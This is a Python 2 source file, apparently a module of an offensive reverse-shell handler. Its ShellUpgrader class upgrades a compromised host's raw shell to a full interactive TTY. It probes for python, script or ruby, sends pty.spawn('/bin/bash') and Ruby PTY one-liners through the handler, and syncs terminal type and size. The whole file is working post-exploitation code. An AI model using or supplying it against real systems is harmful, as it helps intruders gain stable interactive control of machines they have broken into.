import os, time

class ShellUpgrader(object):    
    upgrade_bins = ["python", 'python2', 'python3', 'script', "ruby"]
    upgrade_commands = {
                "python": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
                "python2": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
                "python3": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
                "script": "script /dev/null",
                "ruby": "ruby -r pty -e '$stdout.sync = true; PTY.spawn(\"/bin/bash -i\"){|r, w, p| Thread.new { while true do IO.copy_stream($stdin, w, 1) end };Thread.new { while true do IO.copy_stream(r, $stdout, 1) end }; Process.waitpid(p) }'"
            }

    def __init__(self):
        self.needs_reset = False

    def setup(self):
        self.term = os.environ["TERM"]
        self.rows, self.columns = os.popen('stty size', 'r').read().split()
        print "[+] Got terminal: {}".format(self.term) 
        print "[+] Got terminal size {} rows, {} columns".format(self.rows, self.columns) 

    def find_bin(self):
        for b in ShellUpgrader.upgrade_bins:
            print "[+] Trying.....{}".format(b)
            out = self.handler.send_command_get_output("which {}".format(b))
            if out:
                print "[+] Binary found in {}".format(out.rstrip())
                return b
        
        return False

    def upgrade_shell(self,handler):
        self.handler = handler
        found = self.find_bin()
        
        print "[+] Setting up local terminal....."
        os.system("stty raw -echo")
        self.needs_reset = True
        if found:
            command = ShellUpgrader.upgrade_commands[found]
            handler.send_command(command)
            time.sleep(2)
            handler.send_command("export TERM={}".format(self.term))
            handler.send_command("export SHELL={}".format("/bin/bash"))
            handler.send_command("stty rows {} columns {}".format(self.rows, self.columns))
            handler.send_command("reset")
        else:
            print "[_] No ninary found to upgrade to pty :-("


    def reset_local(self, message):
        if self.needs_reset:
            print "[+] Resetting local terminal....."
            os.system("stty raw echo")
            os.system("reset")
            self.needs_reset = False
            print message
